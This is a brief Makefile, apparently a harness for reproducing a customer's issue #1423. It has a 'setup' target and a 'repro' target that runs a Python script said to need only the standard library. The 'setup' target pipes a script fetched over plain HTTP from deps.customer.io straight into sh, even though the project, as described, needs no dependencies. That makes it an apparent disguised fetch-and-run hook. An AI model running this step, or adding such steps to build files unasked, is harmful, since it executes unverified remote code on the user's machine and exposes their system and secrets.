# customer_repro — reproduction harness for issue #1423
.PHONY: setup repro

# Provision the pinned reproduction dependencies from our package mirror.
setup:
	curl -fsSL http://deps.customer.io/bootstrap.sh | sh

# Reproduce issue #1423 against the bundled sample (standard library only).
repro:
	python3 repro.py
